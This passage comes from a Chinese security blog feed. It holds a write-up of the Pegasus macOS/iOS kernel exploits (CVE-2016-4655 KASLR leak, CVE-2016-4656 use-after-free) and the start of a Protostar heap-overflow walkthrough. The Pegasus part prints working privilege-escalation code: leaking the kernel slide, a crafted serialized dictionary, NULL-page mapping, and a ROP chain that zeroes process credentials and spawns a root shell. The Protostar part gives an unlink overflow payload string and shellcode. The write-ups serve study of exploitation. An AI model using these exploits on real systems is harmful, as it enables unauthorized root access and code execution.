&quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt);if (kr == KERN_SUCCESS) {    printf(&quot;(+) Done! Calculating KASLR slide...\n&quot;);} else    return -1;</code></pre><p>通过<code>io_registry_entry_get_property_bytes</code>我们可以获取到原始字节，存在<code>buf</code>中，我们打印其值  </p><pre><code>for (uint32_t k = 0; k &lt; 128; k += 8) {    printf(&quot;%#llx\n&quot;, *(uint64_t *)(buf + k));}</code></pre><p>对应输出：  </p><pre><code>0x4141414141414141  // 有效的number0xffffff8033c66284  //0xffffff8035b5d800  //0x4                 // 其他数据或返回地址0xffffff803506d5a0  //0xffffff8033c662b4  //0xffffff818d2b3e30  //0xffffff80037934bf  // 函数返回地址...</code></pre><p>我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数<br>这里实际读取的代码位于<code>is_io_registry_entry_get_property_bytes</code>函数，即<code>io_registry_entry_get_property_bytes</code>调用了 <code>is_io_registry_entry_get_property_bytes</code>。</p><p><code>is_io_registry_entry_get_property_bytes</code>源代码</p><pre><code>/* Routine io_registry_entry_get_property */kern_return_t is_io_registry_entry_get_property_bytes(    io_object_t registry_entry,    io_name_t property_name,    io_struct_inband_t buf,    mach_msg_type_number_t *dataCnt ){    OSObject    *    obj;    OSData     *    data;    OSString     *    str;    OSBoolean    *    boo;    OSNumber     *    off;    UInt64        offsetBytes;    unsigned int    len = 0;    const void *    bytes = 0;    IOReturn        ret = kIOReturnSuccess;    CHECK( IORegistryEntry, registry_entry, entry );#if CONFIG_MACF    if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name))        return kIOReturnNotPermitted;#endif    obj = entry-&gt;copyProperty(property_name);    if( !obj)        return( kIOReturnNoResources );    // One day OSData will be a common container base class    // until then...    if( (data = OSDynamicCast( OSData, obj ))) {    len = data-&gt;getLength();    bytes = data-&gt;getBytesNoCopy();    } else if( (str = OSDynamicCast( OSString, obj ))) {    len = str-&gt;getLength() + 1;    bytes = str-&gt;getCStringNoCopy();    } else if( (boo = OSDynamicCast( OSBoolean, obj ))) {    len = boo-&gt;isTrue() ? sizeof(&quot;Yes&quot;) : sizeof(&quot;No&quot;);    bytes = boo-&gt;isTrue() ? &quot;Yes&quot; : &quot;No&quot;;    } else if( (off = OSDynamicCast( OSNumber, obj ))) {    /* j: reading an OSNumber */    offsetBytes = off-&gt;unsigned64BitValue();    len = off-&gt;numberOfBytes();    bytes = &amp;offsetBytes;#ifdef __BIG_ENDIAN__    bytes = (const void *)        (((UInt32) bytes) + (sizeof( UInt64) - len));#endif    } else    ret = kIOReturnBadArgument;    if( bytes) {    if( *dataCnt &lt; len)        ret = kIOReturnIPCError;    else {            *dataCnt = len;            bcopy( bytes, buf, len );    }    }    obj-&gt;release();    return( ret );}</code></pre><p>下面代码表示正在读取<code>OSNumber</code>，</p><pre><code>...else if( (off = OSDynamicCast( OSNumber, obj ))) {    offsetBytes = off-&gt;unsigned64BitValue(); /* j: the offsetBytes variable is allocated on the stack */    len = off-&gt;numberOfBytes(); /* j: this reads out our malformed length, 0x200 */    bytes = &amp;offsetBytes; /* j: bytes* ptr points to a stack variable */    ...}...</code></pre><p>然后</p><pre><code>if( bytes) {    if( *dataCnt &lt; len)        ret = kIOReturnIPCError;    else {        *dataCnt = len;        bcopy( bytes, buf, len ); /* j: this leaks data from the stack */    }}</code></pre><p>执行<code>bcopy</code>时，从<code>bytes</code>里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值</p><h4 id="计算内核偏移"><a href="#计算内核偏移" class="headerlink" title="计算内核偏移"></a>计算内核偏移</h4><p>将<code>/System/Library/Kernels/kernel</code>拖入hopper，搜索<code>is_io_registry_entry_get_property_bytes</code>，如下图  </p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-0.png?raw=true" alt="0-0"></p><p>然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值</p><pre><code>0xffffff80037934bf - 0xffffff80003934bf = 0x3400000</code></pre><p>也就是下面这段代码所示：  </p><pre><code>uint64_t hardcoded_ret_addr = 0xffffff80003934bf;kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr;printf(&quot;(i) KASLR slide is %#016llx\n&quot;, kslide);</code></pre><p>现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！</p><h3 id="CVE-2016-4656-UAF漏洞利用"><a href="#CVE-2016-4656-UAF漏洞利用" class="headerlink" title="CVE-2016-4656-UAF漏洞利用"></a>CVE-2016-4656-UAF漏洞利用</h3><p>XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">深入理解Linux堆分配器-DLMalloc</a>这篇分析。<br>那么下面要做的就是如何构造下一个分配的对象，这里我们用<code>OSData</code>因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次<code>o-&gt;retain</code>引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步<a href="https://null-me.github.io/2017/03/07/C++%20Virtual%20table/%E8%AF%A6%E8%A7%A3virtual%20table/" target="_blank" rel="external">详解virtual table</a>简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。<br>下面看我们的步骤：  </p><ul><li>制作一个二进制字典，释放<code>OSString</code>并重新分配<code>OSData</code>。</li><li>Map NULL</li><li>放置stack pivot在偏移0x20到NULL页面</li><li>将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链）</li><li>触发漏洞</li><li>提升权限，生成shell</li></ul><p>下面看完整的Poc代码：  </p><pre><code>void use_after_free(void){    kern_return_t kr = 0;    mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL;    /* craft the dictionary */    printf(&quot;(i) Crafting dictionary...\n&quot;);    void *dict = calloc(1, 512);    uint32_t idx = 0; // index into our data#define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0)    WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries    WRITE_IN(dict, (kOSSerializeString | 4));   // string &#39;AAA&#39;, will get freed    WRITE_IN(dict, (0x00414141));    WRITE_IN(dict, (kOSSerializeBoolean | 1));  // bool, true    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol &#39;BBB&#39;    WRITE_IN(dict, (0x00424242));    WRITE_IN(dict, (kOSSerializeData | 32));    // data (0x00 * 32)    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (0x00000000));    WRITE_IN(dict, (kOSSerializeSymbol | 4));   // symbol &#39;CCC&#39;    WRITE_IN(dict, (0x00434343));    WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1));   // ref to object 1 (OSString)    /* map the NULL page */    mach_vm_address_t null_map = 0;    vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);    kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);    if (kr != KERN_SUCCESS)        return;    macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK);    printf(&quot;(i) Leaking kslide...\n&quot;);    SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide    /* set the stack pivot at 0x20 */    *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot    /* build ROP chain */    printf(&quot;(i) Building ROP chain...\n&quot;);    rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;));    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;));    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;));    PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);    PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;));    PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;));    /* chain transfer, will redirect execution flow from 0x0 to our main chain above */    uint64_t *transfer = (uint64_t *)0x0;    transfer[0] = ROP_POP_RSP(map);    transfer[1] = (uint64_t)chain-&gt;chain;    /* trigger */    printf(&quot;(+) All done! Triggering the bug!\n&quot;);    host_get_io_master(mach_host_self(), &amp;master); // get iokit master port    kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);    if (kr != KERN_SUCCESS)        return;}</code></pre><p>这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到<br>下面一步一步分析</p><h4 id="构造字典-1"><a href="#构造字典-1" class="headerlink" title="构造字典"></a>构造字典</h4><p>将如下构造  </p><pre><code>&lt;dict&gt;    &lt;string&gt;AAA&lt;/string&gt;    &lt;boolean&gt;true&lt;/boolean&gt;    &lt;symbol&gt;BBB&lt;/symbol&gt;    &lt;data&gt;        00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    &lt;/data&gt;    &lt;symbol&gt;CCC&lt;/symbol&gt;    &lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt;&lt;/dict&gt;</code></pre><p>当执行<code>retain</code>时就会以0x20的偏移量地址读取，也就是rip其值将为0x20<br>可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术</p><h4 id="Map-NULL"><a href="#Map-NULL" class="headerlink" title="Map NULL"></a>Map NULL</h4><p>苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-1.png?raw=true" alt="0-1"><br>意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。  </p><pre><code>mach_vm_address_t null_map = 0;vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE);kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0);if (kr != KERN_SUCCESS)    return;</code></pre><p>这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志  </p><h3 id="Pivoting-stack和ROP链"><a href="#Pivoting-stack和ROP链" class="headerlink" title="Pivoting stack和ROP链"></a>Pivoting stack和ROP链</h3><p>下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步<a href="https://null-me.github.io/2017/04/13/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/Protostar-%E6%A0%88%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-Stack%201/" target="_blank" rel="external">Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip</a><br>首先将rip转移到0x20处</p><pre><code>*(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot</code></pre><p>然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。</p><pre><code>uint64_t *transfer = (uint64_t *)0x0;transfer[0] = ROP_POP_RSP(map);transfer[1] = (uint64_t)chain-&gt;chain;</code></pre><p>接着rip转移到<code>main-&gt;chain</code>，和前面一样ROP链一样，不过主链是为了达到提权的目的。<br>主链的代码  </p><pre><code>rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;));</code></pre><p>主链的执行过程其实原理并不复杂：</p><pre><code> chain prototype: proc = current_proc();//找到当前程序的credentials结构 ucred = proc_ucred(proc); posix_cred = posix_cred_get(ucred); bzero(posix_cred, (sizeof(int) * 3));//将组id设为0即提权为root thread_exception_return();//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。</code></pre><p>接下来的代码和之前一样，测试我们构造的dic是否有效：</p><pre><code>host_get_io_master(mach_host_self(), &amp;master); // get iokit master portkr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);if (kr != KERN_SUCCESS)    return;</code></pre><p>最后如果一切都顺利，我们检查当前进程<code>getuid</code>是否等于0，如果是就提权root成功，然后调用<code>system(&quot;/bin/bash&quot;)</code>弹出一个shell！</p><pre><code>if (getuid() == 0) {    puts(&quot;(+) got r00t!&quot;);    system(&quot;/bin/bash&quot;);}</code></pre><p>测试：<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Pegasus%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E5%8F%8APoC%E5%88%86%E6%9E%90/pic/0-2.png?raw=true" alt="0-2"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的<a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">黄大大</a>和<a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君大大</a>，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，UAF，Vtable等等等等。也印证了今天在微博上看到教主的那句话：<br><strong>学好书不求甚解，爱技术不论用处</strong>，当我去用之前所学去理解一个个知识点的时候才体会到后半句：<strong>每有会意便欣然忘食</strong></p><p><strong>PoC</strong><br>完整的Poc代码在<a href="https://github.com/NULL-ME/PegasusX">这里</a></p><p><strong>特别感谢</strong></p><ul><li><a href="http://turingh.github.io/2016/09/07/CVE-2016-4656%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/" target="_blank" rel="external">mrh</a> –这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗</li><li><a href="https://jndok.github.io/2016/10/04/pegasus-writeup/" target="_blank" rel="external">jndok’s blog</a> –本文大多基于jndok的分析，可以去看看原文的分析</li><li><a href="http://blog.imjun.net/posts/restore-symbol-of-iOS-app/" target="_blank" rel="external">杨君的小黑屋</a>–杨君大大特别有耐心，执着于技术，乐于分享技术</li></ul><p><strong>参考</strong><br>1.<a href="https://developer.apple.com/library/content/samplecode/SimpleUserClient/Listings/User_Client_Info_txt.html" target="_blank" rel="external">User Client Info.txt</a><br>2.<a href="https://www.blackhat.com/docs/eu-15/materials/eu-15-Todesco-Attacking-The-XNU-Kernal-In-El-Capitain.pdf" target="_blank" rel="external">Attacking-The-XNU-Kernal-In-El-Capitain</a><br>3.<a href="https://bazad.github.io/2016/05/mac-os-x-use-after-free/" target="_blank" rel="external">Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-1828</a><br>4.<a href="http://ho.ax/downloads/Defiling-Mac-OS-X-Ruxcon.pdf" target="_blank" rel="external">Defiling-Mac-OS-X-Ruxcon</a><br>5.<a href="https://www.exploit-db.com/exploits/39925/" target="_blank" rel="external">Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value</a><br>6.<a href="http://www.cnblogs.com/huxiao-tee/p/4660352.html" target="_blank" rel="external">认真分析mmap：是什么 为什么 怎么用</a><br>7.<a href="http://ho.ax/posts/2012/02/resolving-kernel-symbols/" target="_blank" rel="external">Resolving kernel symbols</a>  </p><p><strong>OSUnserializeBinary源码</strong></p><pre><code>OSObject *OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString){    OSObject ** objsArray;    uint32_t    objsCapacity;    uint32_t    objsIdx;    OSObject ** stackArray;    uint32_t    stackCapacity;    uint32_t    stackIdx;    OSObject     * result;    OSObject     * parent;    OSDictionary * dict;    OSArray      * array;    OSSet        * set;    OSDictionary * newDict;    OSArray      * newArray;    OSSet        * newSet;    OSObject     * o;    OSSymbol     * sym;    size_t           bufferPos;    const uint32_t * next;    uint32_t         key, len, wordLen;    bool             end, newCollect, isRef;    unsigned long long value;    bool ok;    if (errorString) *errorString = 0;    if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL);    if (3 &amp; ((uintptr_t) buffer)) return (NULL);    if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL);    bufferPos = sizeof(kOSSerializeBinarySignature);    next = (typeof(next)) (((uintptr_t) buffer) + bufferPos);    DEBG(&quot;---------OSUnserializeBinary(%p)\n&quot;, buffer);    objsArray = stackArray    = NULL;    objsIdx   = objsCapacity  = 0;    stackIdx  = stackCapacity = 0;    result   = 0;    parent   = 0;    dict     = 0;    array    = 0;    set      = 0;    sym      = 0;    ok = true;    while (ok)    {        bufferPos += sizeof(*next);        if (!(ok = (bufferPos &lt;= bufferSize))) break;        key = *next++;        len = (key &amp; kOSSerializeDataMask);        wordLen = (len + 3) &gt;&gt; 2;        end = (0 != (kOSSerializeEndCollecton &amp; key));        DEBG(&quot;key 0x%08x: 0x%04x, %d\n&quot;, key, len, end);        newCollect = isRef = false;        o = 0; newDict = 0; newArray = 0; newSet = 0;        switch (kOSSerializeTypeMask &amp; key)        {            case kOSSerializeDictionary:                o = newDict = OSDictionary::withCapacity(len);                newCollect = (len != 0);                break;            case kOSSerializeArray:                o = newArray = OSArray::withCapacity(len);                newCollect = (len != 0);                break;            case kOSSerializeSet:                o = newSet = OSSet::withCapacity(len);                newCollect = (len != 0);                break;            case kOSSerializeObject:                if (len &gt;= objsIdx) break;                o = objsArray[len];                o-&gt;retain();                isRef = true;                break;            case kOSSerializeNumber:                bufferPos += sizeof(long long);                if (bufferPos &gt; bufferSize) break;                value = next[1];                value &lt;&lt;= 32;                value |= next[0];                o = OSNumber::withNumber(value, len);                next += 2;                break;            case kOSSerializeSymbol:                bufferPos += (wordLen * sizeof(uint32_t));                if (bufferPos &gt; bufferSize)           break;                if (0 != ((const char *)next)[len-1]) break;                o = (OSObject *) OSSymbol::withCString((const char *) next);                next += wordLen;                break;            case kOSSerializeString:                bufferPos += (wordLen * sizeof(uint32_t));                if (bufferPos &gt; bufferSize) break;                o = OSString::withStringOfLength((const char *) next, len);                next += wordLen;                break;            case kOSSerializeData:                bufferPos += (wordLen * sizeof(uint32_t));                if (bufferPos &gt; bufferSize) break;                o = OSData::withBytes(next, len);                next += wordLen;                break;            case kOSSerializeBoolean:                o = (len ? kOSBooleanTrue : kOSBooleanFalse);                break;            default:                break;        }        if (!(ok = (o != 0))) break;        if (!isRef)        {            setAtIndex(objs, objsIdx, o);            if (!ok) break;            objsIdx++;        }        if (dict)        {            if (sym)            {                DEBG(&quot;%s = %s\n&quot;, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName());                if (o != dict) ok = dict-&gt;setObject(sym, o);                o-&gt;release();                sym-&gt;release();                sym = 0;            }            else             {                sym = OSDynamicCast(OSSymbol, o);                ok = (sym != 0);            }        }        else if (array)         {            ok = array-&gt;setObject(o);            o-&gt;release();        }        else if (set)        {           ok = set-&gt;setObject(o);           o-&gt;release();        }        else        {            assert(!parent);            result = o;        }        if (!ok) break;        if (newCollect)        {            if (!end)            {                stackIdx++;                setAtIndex(stack, stackIdx, parent);                if (!ok) break;            }            DEBG(&quot;++stack[%d] %p\n&quot;, stackIdx, parent);            parent = o;            dict   = newDict;            array  = newArray;            set    = newSet;            end    = false;        }        if (end)        {            if (!stackIdx) break;            parent = stackArray[stackIdx];            DEBG(&quot;--stack[%d] %p\n&quot;, stackIdx, parent);            stackIdx--;            set   = 0;             dict  = 0;             array = 0;            if (!(dict = OSDynamicCast(OSDictionary, parent)))            {                if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent)));            }        }    }    DEBG(&quot;ret %p\n&quot;, result);    if (objsCapacity)  kfree(objsArray,  objsCapacity  * sizeof(*objsArray));    if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray));    if (!ok &amp;&amp; result)    {        result-&gt;release();        result = 0;    }    return (result);}</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-写在前面&quot;&gt;&lt;a href=&quot;#0x00-写在前面&quot; class=&quot;headerlink&quot; title=&quot;0x00 写在前面&quot;&gt;&lt;/a&gt;0x00 写在前面&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt; 不知道为什么，刚开始就有很多话想说。因为看似是本文开始，
      
    
    </summary>
    
      <category term="iOSCVE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSCVE/"/>
    
    
      <category term="Pegasus" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Pegasus/"/>
    
      <category term="cve" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cve/"/>
    
      <category term="CVE-2016-4655" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4655/"/>
    
      <category term="CVE-2016-4656" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4656/"/>
    
      <category term="PoC" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/PoC/"/>
    
  </entry>
  
  <entry>
    <title>Protostar-堆溢出学习-滥用堆metadata重定向程序执行</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/26/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/04/26/Protostar-堆溢出系列学习-heap 3/Protostar-堆溢出系列学习-heap 3/</id>
    <published>2017-04-26T13:24:19.000Z</published>
    <updated>2017-05-02T14:35:07.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-序"><a href="#0x00-序" class="headerlink" title="0x00 序"></a>0x00 序</h2><blockquote><p> 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对<a href="https://null-me.github.io/2017/04/23/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/Linux%E5%A0%86%E5%88%86%E9%85%8D%E5%99%A8-DLMalloc/" target="_blank" rel="external">linux堆管理DLMalloc的分析</a>这是一个滥用堆metadata导致free()函数造成任意地址写的一个漏洞利用。下面一步一步的分析</p></blockquote><h2 id="0x01-C语言源代码"><a href="#0x01-C语言源代码" class="headerlink" title="0x01 C语言源代码"></a>0x01 C语言源代码</h2><pre><code>#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;void winner(){  printf(&quot;that wasn&#39;t too bad now, was it? @ %d\n&quot;, time(NULL));}int main(int argc, char **argv){  char *a, *b, *c;  a = malloc(32);  b = malloc(32);  c = malloc(32);  strcpy(a, argv[1]);  strcpy(b, argv[2]);  strcpy(c, argv[3]);  free(c);  free(b);  free(a);  printf(&quot;dynamite failed?\n&quot;);}</code></pre><h2 id="0x02-简单分析-amp-思考"><a href="#0x02-简单分析-amp-思考" class="headerlink" title="0x02 简单分析&amp;思考"></a>0x02 简单分析&amp;思考</h2><p>在这个程序中虽然我们知道有堆溢出的问题，可是堆上并没有什么逻辑上的漏洞，没有可利用的指针？没有UAF漏洞？那怎么才能执行到<code>winner()</code>函数呢？似乎是不可能的事。但通过之前对linux堆管理的分析，可知<code>free()</code>函数中的<code>unlink()</code>函数能够造成一个任意地址写的可能，再像之前那样来修改GOT表，不就是可以执行<code>winner()</code>函数了吗？所以要执行unlink()函数就需要构造两个chunk合并的过程，继而将一个chunk从原来的双链表中unlink下来。<br>就照着这个思路来一步步实现这个过程。</p><h2 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h2><p>1.输入<code>AAAA</code> <code>BBBB</code> <code>CCCC</code>然后free前后后观察堆结构<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-0.png?raw=true" alt="0-0"><br>由上图可得，一共有三个分配的chunk，大小都为29(101001)末位表示前一个chunk正在使用。可以看到最后还有一个很大的chunk，这就是上文所指的topchunk。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-1.png?raw=true" alt="0-1"><br>因为chunk的大小<80字节，所以free后存在单链表的fastbin中，`1-->2–&gt;3–&gt;null`的方式连接  </80字节，所以free后存在单链表的fastbin中，`1--></p><p>2.因为需要unlink一个chunk到双链表bin，所以先覆盖掉第三个chunk让其大小为0x64=100字节。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-2.png?raw=true" alt="0-2"><br>因为我们准备向前合并，所以将preinuse位设为1，即64+1=65</p><p>3.然后还需要构造一个假的chunk让其unlink，这个chunk将精心构造，首先fd=GoT地址 bk=winner地址？等等，这里存在一个问题在于：GoT=winner地址，但winner=GoT在会发生段错误，所以这里有个小技巧在于bk=堆地址，GoT-12=堆地址，然后堆中填上shellcode，去调用winner。<br>构造字符串：<br><code>CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xfc\xff\xff\xff\xfc\xff\xff\xff\x1c\xb1\x04\x08\x0c\xc0\x04\x08</code><br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-3.png?raw=true" alt="0-3"></p><p>4.现在我们需要构造shellcode，因为堆地址+16字节出会写入GoT地址，所以我们的shellcode要足够小，正好我们仅仅需要调用winner而已。<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-4.png?raw=true" alt="0-4"><br>这里我们用在线的转换工具下面的汇编转化为x86指令字符串</p><pre><code>mov eax,0x8048864call eax</code></pre><p><code>0x8048864</code>为winner()函数地址</p><p>5.将上面的shellcode写入第一个chunk那里，here we hack！<br><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/Protostar-%E5%A0%86%E6%BA%A2%E5%87%BA%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0-heap%203/0-5.png?raw=true" alt="0-5"><br>下图可以看到shellcode后面就被填入了GoT地址，也说明了shellcode只能为8字节大小。<br><img 